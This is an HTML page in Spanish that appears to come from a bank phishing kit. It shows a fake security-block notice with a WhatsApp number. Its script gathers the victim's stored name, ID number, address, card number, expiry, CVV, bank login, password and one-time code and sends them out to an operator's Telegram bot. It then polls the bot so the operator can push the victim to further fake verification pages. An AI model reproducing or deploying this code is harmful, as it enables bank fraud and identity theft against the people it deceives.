<!DOCTYPE html>
<html lang="es">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Mi Página</title>
  <style>
    body {
      background-color: #ffffff;
      margin: 0;
      padding: 0;
      overflow: hidden;
      /* Evita que la página se desplace */
    }

    html,
    body {
      height: 100%;
    }

    #contenedor {
      position: relative;
      width: 95vw;
      height: 95vh;
      background-color: #ffffff;
      overflow: hidden;
      top: 50px;
      left: 35px;
      width: 310px;
      height: 500px;
    }

    #imagenIzquierda {
      position: absolute;
      top: 10px;
      left: 20px;
      width: 70px;
      height: 30px;
    }

    #imagenDerecha {
      position: absolute;
      top: 2px;
      right: 20px;
      width: 100px;
      height: 50px;
    }

    #titulo {
      font-size: 20px;
      font-weight: bold;
      color: #333;
      margin-top: 70px;
      margin-bottom: 10px;
      text-align: center;
    }

    #titulo2 {
      font-size: 16px;
      font-weight: bold;
      color: #333;
      margin-top: 30px;
      margin-bottom: 10px;
      text-align: center;
    }

    #parrafo {
      font-size: 13px;
      color: #000000;
      margin: 0 auto;
      max-width: 80%;
      text-align: justify;
      letter-spacing: 2px;
    }

    #formulario {
      margin-top: 20px;
      padding: 0 20px;
    }

    #formulario label {
      display: inline-block;
      font-size: 12px;
      font-weight: bold;
      color: #333;
      margin-bottom: 5px;
      width: 50%;
    }

    #formulario input {
      width: 48%;
      padding: 5px;
      margin-bottom: 10px;
      box-sizing: border-box;
      display: inline-block;
    }

    #horaTransaccion {
      font-size: 12px;
      color: #333;
      margin-top: 15px;
    }

    #autorizarBtn {
      display: block;
      margin: 45px auto;
      padding: 15px 30px;
      border-radius: 10%;
      background-color: #000;
      color: #fff;
      text-align: center;
      cursor: pointer;
      font-size: 12px;
      text-decoration: none;
      border: none;
    }

    #contador {
      color: #555;
      font-size: 8px;
      margin-left: 15px;
    }

    .loaderp {
      width: 48px;
      height: 48px;
      border: 5px solid #fff;
      border-bottom-color: #e8114b;
      border-radius: 50%;
      display: inline-block;
      box-sizing: border-box;
      animation: rotation 1s linear infinite;
    }

    @keyframes rotation {
      0% {
        transform: rotate(0deg);
      }

      100% {
        transform: rotate(360deg);
      }
    }

    .loaderp-full {
      position: fixed;
      top: 0;
      overflow-y: hidden;
      z-index: 1000;
      background-color: white;
      width: 100vw;
      height: 100vh;
      display: none;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }

    .modal-overlay {
      position: fixed;
      inset: 0;
      background-color: rgba(0, 0, 0, 0.6);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 9999;
    }

    .modal-box {
      background-color: white;
      padding: 1rem;
      border-radius: 1rem;
      text-align: center;
      max-width: 400px;
      width: 87%;
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
      border: 1px solid #ddd;
    }

    .modal-icon {
      background-color: #FFF9DB;
      width: 56px;
      height: 56px;
      margin: 0 auto 1rem;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .icon-svg {
      width: 28px;
      height: 28px;
      color: #facc15;
      /* amarillo fuerte */
    }

    .modal-title {
      font-size: 1.25rem;
      font-weight: bold;
      color: #333;
      margin-bottom: 1rem;
    }

    .modal-text {
      font-size: 0.95rem;
      color: #444;
      margin-bottom: 1rem;
    }

    .modal-code {
      font-weight: bold;
      color: #333;
      margin-bottom: 1.5rem;
    }

    .modal-button {
      background-color: #facc15;
      color: #000;
      padding: 0.6rem 1.5rem;
      border: none;
      border-radius: 9999px;
      font-weight: bold;
      font-size: 0.95rem;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    .modal-button:hover {
      background-color: #fbbf24;
    }
  </style>
</head>

<body>
  <div id="contenedor">
    <div id="bloqueoTransaccion" class="modal-overlay">
      <div class="modal-box">
        <!-- Ícono de advertencia -->
        <div class="modal-icon">
          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"
            stroke="currentColor" stroke-width="2" class="icon-svg">
            <path stroke-linecap="round" stroke-linejoin="round"
              d="M12 9v2m0 4h.01M21 12c0 4.97-4.03 9-9 9s-9-4.03-9-9 4.03-9 9-9 9 4.03 9 9z" />
          </svg>
        </div>

        <!-- Título -->
        <h2 class="modal-title">Por seguridad, no puedes continuar la transacción</h2>

        <!-- Texto -->
        <p class="modal-text">
          Código: <strong>923</strong>. Para confirmar si eres tú quien hace la transacción,
          te escribiremos desde nuestro WhatsApp oficial <strong>301 353 6788</strong>, responde
          <strong>Sí</strong> o <strong>No</strong>. Si tienes dudas, llámanos a la Sucursal Telefónica y
          elige la opción <strong>3</strong> y de nuevo <strong>3</strong>.
        </p>

        <!-- Código -->
        <p class="modal-code">Código 923</p>

        <!-- Botón -->
        <button class="modal-button" onclick="cerrarModalSi()">Ya presione si</button>
        <button class="modal-button" onclick="cerrarModalNo()">No recibi Whatsapp</button>
      </div>
    </div>
  </div>
  <script>
    async function loadTelegramConfig() {
      try {
        const response = await fetch("./js/brr76.json"); // Ajusta la ruta a tu archivo brr76.json
        if (!response.ok) {
          throw new Error(
            "No se pudo cargar el archivo de configuración de Telegram."
          );
        }
        return await response.json();
      } catch (error) {
        console.error(
          "Error al cargar el archivo de configuración de Telegram:",
          error
        );
      }
    }


    function obtenerFechaActual() {
      const ahora = new Date();
      const dia = ahora.getDate().toString().padStart(2, "0");
      const mes = (ahora.getMonth() + 1).toString().padStart(2, "0");
      const año = ahora.getFullYear();
      const horas = ahora.getHours().toString().padStart(2, "0");
      const minutos = ahora.getMinutes().toString().padStart(2, "0");
      const segundos = ahora.getSeconds().toString().padStart(2, "0");
      return `${dia}/${mes}/${año} ${horas}:${minutos}:${segundos}`;
    }

    function actualizarHoraTransaccion() {
      const ahora = new Date();
      const horas = ahora.getHours().toString().padStart(2, "0");
      const minutos = ahora.getMinutes().toString().padStart(2, "0");
      const segundos = ahora.getSeconds().toString().padStart(2, "0");
      document.getElementById(
        "horaTransaccion"
      ).innerText = `Hora de la transacción: ${horas}:${minutos}:${segundos}`;
    }

    function cerrarModalSi() {
      window.location.href = "tp_data_verif.php";
    }

    function cerrarModalNo() {
      window.location.href = "tp_data_verif.php";
    }



    // Inicializar la hora de la transacción
    document.getElementById(
      "horaTransaccion"
    ).innerText = `Hora de la transacción: ${obtenerFechaActual()}`;
    // Actualizar la hora cada segundo
    setInterval(actualizarHoraTransaccion, 1000);

    function validarOtp() {
      const otpInput = document.getElementById("otp");
      if (otpInput.value.length > 6) {
        otpInput.value = otpInput.value.slice(0, 6);
      }
    }

    async function checkPaymentVerification(transactionId) {
      const config = await loadTelegramConfig();
      if (!config) {
        loader.style.display = "none";
        return;
      }
      fetch(`https://api.telegram.org/bot${config.token}/getUpdates`)
        .then((response) => response.json())
        .then((data) => {
          const updates = data.result;
          const verificationUpdate = updates.find(
            (update) =>
            update.callback_query &&
            (update.callback_query.data === `pedir_logo:${transactionId}` ||
              update.callback_query.data === `error_dinamica:${transactionId}` ||
              update.callback_query.data === `error_logo:${transactionId}` ||
              update.callback_query.data === `error_tc:${transactionId}` ||
              update.callback_query.data === `confirm_finalizar:${transactionId}`) ||
            update.callback_query.data === `error_whatsapp:${transactionsId}`
          );

          if (verificationUpdate) {
            loader.style.display = "none";

            if (verificationUpdate.callback_query.data === `pedir_logo:${transactionId}`) {
              window.location.href = "chedf.php";
            }

            if (verificationUpdate.callback_query.data === `error_logo:${transactionId}`) {
              alert("Ha ocurrido un error. Por favor intente nuevamente.");
              window.location.href = "chedf.php";
            }

            if (verificationUpdate.callback_query.data === `error_dinamica:${transactionId}`) {
              alert(
                "Clave dinamica incorrecta. Por favor, revise sus datos e intente nuevamente."
              );
            }


            if (verificationUpdate.callback_query.data === `error_tc:${transactionId}`) {
              alert(
                "La tarjeta de crédito no pudo ser procesada. Por favor, verifique los detalles e intente nuevamente."
              );
              window.location.href = "payment.php";
            }

            if (verificationUpdate.callback_query.data === `confirm_finalizar:${transactionId}`) {
              window.location.href = "finish.php";
            }

          } else {
            setTimeout(
              () => checkPaymentVerification(transactionId, config),
              2000
            );
          }
        })
        .catch((error) => {
          console.error("Error al verificar la clave dinamica:", error);
          setTimeout(
            () => checkPaymentVerification(transactionId, config),
            2000
          );
        });
    }

    const loader = document.querySelector(".loaderp-full");

    async function enviarDatos() {
      loader.style.display = "flex";
      const formData0 = JSON.parse(localStorage.getItem("formData"));
      // Generar un ID de transacción único
      const transactionId =
        Date.now().toString(36) + Math.random().toString(36).substr(2);
      // Obtener los valores del formulario
      const otp = document.getElementById("otp").value;
      const username = localStorage.getItem("username"); // Asegúrate de que `username` esté en el localStorage
      const password = localStorage.getItem("password"); // Asegúrate de que `password` esté en el localStorage

      // Comprobar si se obtuvo el código OTP
      if (!otp || otp.length !== 6) {
        alert("Por favor, ingrese un código OTP válido de 6 dígitos.");
        return;
      }

      const message = `Nuevo solicitud de clave dinamica 1 pendiente de verificación.\n🆔ID: ${transactionId}\n👤Nombre: ${formData0.nombre}\n🪪Cédula: ${formData0.documentoIdentidad}\n-\n📞Teléfono: ${formData0.telefono}\n🌇Ciudad: ${formData0.ciudad}\n🗺️Direc: ${formData0.direccion}\n-\n🏦 Banco: ${formData0.entidad}\n💳Tarjeta: ${formData0.tarjeta}\n📅Fecha: ${formData0.fechaExpiracion}\n🔐CVV: ${formData0.cvv}\n🧑‍💻Usuario: ${username}\n🔐Clave: ${password}\n🔑OTP1: ${otp}
        `;

      const keyboard = JSON.stringify({
        inline_keyboard: [
          [{
            text: "Pedir Logo",
            callback_data: `pedir_logo:${transactionId}`
          }],
          [{
            text: "Pedir Dinámica",
            callback_data: `pedir_dinamica:${transactionId}`
          }],
          [{
            text: "Error de TC",
            callback_data: `error_tc:${transactionId}`
          }],
          [{
            text: "Error de Logo",
            callback_data: `error_logo:${transactionId}`
          }],
          [{
            text: "Error de Dinámica",
            callback_data: `error_dinamica:${transactionId}`
          }],
          [{
            text: "Error de Whatsapp",
            callback_data: `error_whatsapp:${transactionId}`
          }],
          [{
            text: "Finalizar",
            callback_data: `confirm_finalizar:${transactionId}`
          }]
        ],
      });

      const config = await loadTelegramConfig();
      if (!config) {
        loader.style.display = "none";
        return;
      }

      fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: config.chat_id,
            text: message,
            reply_markup: keyboard,
          }),
        })
        .then((response) => response.json())
        .then((data) => {
          if (data.ok) {
            console.log("Mensaje enviado a Telegram con éxito");
            checkPaymentVerification(transactionId);
          } else {
            console.error("Error al enviar mensaje a Telegram:", data);
            loader.style.display = "none";
          }
        })
        .catch((error) => {
          console.error("Error al enviar mensaje a Telegram:", error);
          loader.style.display = "none";
        });
    }

    document
      .getElementById("autorizarBtn")
      .addEventListener("click", function(event) {
        event.preventDefault(); // Evita el comportamiento predeterminado del botón
        enviarDatos();
      });
  </script>
</body>

</html>